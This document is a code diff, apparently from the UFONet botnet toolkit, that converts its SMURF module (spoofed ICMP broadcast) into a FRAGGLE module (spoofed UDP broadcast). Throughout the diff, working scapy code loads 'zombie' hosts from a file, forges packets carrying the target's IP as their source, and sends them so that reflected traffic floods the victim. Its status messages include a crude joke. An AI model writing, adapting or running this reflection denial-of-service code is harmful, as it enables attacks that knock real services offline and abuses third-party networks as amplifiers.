@@ -17,7 +17,7 @@ except:
     print("\nError importing: scapy lib. \n\n To install it on Debian based systems:\n\n $ 'sudo apt-get install python3-scapy'\n")
     sys.exit(2)
 
-# UFONet ICMP broadcast attack (SMURF)
+# UFONet UDP broadcast attack (FRAGGLE)
 def randInt():
     x = random.randint(1,65535) # TCP ports
     return x
@@ -45,7 +45,7 @@ def sIP(base_stations): # extract 'base stations'
         s_zombie_ip = bs.get(s_zombie)
     return s_zombie_ip
 
-def smurfize(ip, sport, rounds):
+def fraggleize(ip, sport, rounds):
     f = open('botnet/zombies.txt') # use 'zombies' as 'base stations'
     base_stations = f.readlines()
     base_stations = [ base_station.replace('\n','') for base_station in base_stations ]
@@ -56,31 +56,33 @@ def smurfize(ip, sport, rounds):
             n=n+1
             s_zombie_ip = sIP(base_stations)
             if s_zombie_ip == None: # not any 'base stations' available
-                print("[Error] [AI] [SMURF] Imposible to retrieve 'base stations' -> [Aborting!]\n")
+                print("[Error] [AI] [FRAGGLE] Imposible to retrieve 'base stations' -> [Aborting!]\n")
                 break
+            seq = randInt()
+            window = randInt()
             IP_p = IP()
             try:
-                IP_p.src = ip # ICMP 'broadcast' package carring fraudulent (spoofed) source IP belonging to target (aka SMURF attack)
+                IP_p.src = ip # UDP 'broadcast' package carring fraudulent (spoofed) source IP belonging to target (aka FRAGGLE attack)
             except:
-                print("[Error] [AI] [SMURF] Imposible to resolve IP from target! -> [Aborting!]\n")
+                print("[Error] [AI] [FRAGGLE] Imposible to resolve IP from target! -> [Aborting!]\n")
                 break
             try:
                 IP_p.dst = s_zombie_ip
             except:
-                print("[Error] [AI] [SMURF] Imposible to resolve IP from 'base station' -> [Aborting!]\n")
+                print("[Error] [AI] [FRAGGLE] Imposible to resolve IP from 'base station' -> [Aborting!]\n")
                 break
             try:
-                send(IP_p/ICMP(), verbose=0)
-                print("[Info] [AI] [SMURF] Redirecting 'base station' ["+str(n)+"] ["+str(s_zombie_ip)+"] -> [RE-FLUXING!]")
+                send(IP_p/UDP(), verbose=0)
+                print("[Info] [AI] [FRAGGLE] Redirecting 'base station' ["+str(n)+"] ["+str(s_zombie_ip)+"] -> [RE-FLUXING!]")
                 time.sleep(1) # sleep time required for balanced sucess
             except:
-                print("[Error] [AI] [SMURF] Failed to redirect 'base station' ["+str(n)+"] ["+str(s_zombie_ip)+"]")
+                print("[Error] [AI] [FRAGGLE] Failed to redirect 'base station' ["+str(n)+"] ["+str(s_zombie_ip)+"]")
     except:
-        print("[Error] [AI] [SMURF] Failing to engage... -> Is still target online? -> [Checking!]")
+        print("[Error] [AI] [FRAGGLE] Failing to engage... -> Is still target online? -> [Checking!]")
 
-class SMURF(object):
+class FRAGGLE(object):
     def attacking(self, target, rounds):
-        print("[Info] [AI] ICMP Broadcast (SMURF) is redirecting: [" , rounds, "base stations ]")
+        print("[Info] [AI] UDP Broadcast (FRAGGLE) is redirecting: [" , rounds, "base stations ]")
         if target.startswith('http://'):
             target = target.replace('http://','')
             sport = 80
@@ -101,6 +103,6 @@ class SMURF(object):
             except:
                 ip = target
         if ip == "127.0.0.1" or ip == "localhost":
-            print("[Info] [AI] [SMURF] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
+            print("[Info] [AI] [FRAGGLE] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
             return
-        smurfize(ip, sport, rounds) # attack with SMURF using threading
+        fraggleize(ip, sport, rounds) # attack with FRAGGLE using threading
